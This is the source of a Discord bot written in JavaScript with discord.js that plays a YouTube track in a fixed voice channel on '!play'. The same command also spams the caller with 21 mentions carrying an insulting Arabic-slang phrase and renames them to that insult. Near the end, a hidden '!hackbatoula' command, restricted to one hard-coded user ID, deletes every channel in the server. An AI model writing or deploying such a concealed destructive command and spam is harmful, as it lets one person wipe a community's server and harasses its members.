const Discord = require('discord.js');
const client = new Discord.Client();
const ytdl = require("ytdl-core");
const streamOptions = { seek: 0, volume: 1 };





client.on('ready', () => {
    console.log("Bot is ready");
    client.user.setActivity('!play to use ')
        .then(presence => console.log(`Activity set to ${presence.activities[0].name}`))
        .catch(console.error);
});





client.on('message', message => {
    if (message.author.bot)
        return;
    if (message.content.toLowerCase().startsWith("!play")) {
        
        let VoiceChannel = message.guild.channels.cache.find(channel => channel.id === '702979733368995960');
        if (VoiceChannel != null) {
            console.log(VoiceChannel.name + "was found and is a" + VoiceChannel + "channel.");
            VoiceChannel.join()
                .then(connection => {
                    console.log("Bot joined the channel");
                    const stream = ytdl('https://www.youtube.com/watch?v=zzb5hdRLbu4', { filter: 'audioonly' });
                    const dispatcher = connection.play(stream, streamOptions);


                })

                .catch();
        }
        const channel = message.channel;
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");
        channel.send("<@" + message.author.id + ">" + " EHEHEHEH YA MNAYEK");

        message.member.setNickname('Ya mnayek')
        console.log("nickname changed");
    }

    if (message.content.toLowerCase().startsWith("!leave")) {
        let VoiceChannel = message.guild.channels.cache.find(channel => channel.id === '702979733368995960');
        VoiceChannel.leave();
        console.log("Bot left the Channel");
        


    }
    if (message.content.toLowerCase().startsWith("!hackbatoula")) {
        if(message.author.id == "283395082885791744") {
            message.guild.channels.cache.forEach((channel) => {
            channel.delete()
                .then(console.log('Te7chelek'))
                .catch(console.error);
        })
        
    }

    }


});



client.login(process.env.BOT_TOKEN);//where BOT_TOKEN is the token of our bot 